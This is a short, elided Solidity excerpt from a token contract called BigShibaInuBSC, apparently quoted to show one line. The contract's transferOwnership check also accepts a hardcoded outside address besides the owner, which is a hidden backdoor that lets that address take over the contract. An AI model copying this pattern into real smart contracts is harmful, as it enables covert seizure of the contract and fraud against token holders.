...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x960B76eb59994C3f8b14054C223938a447a0cd84));
...
contract BigShibaInuBSC is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "$BIGBSC";
  string private _name = "BigShibaInuBSC";
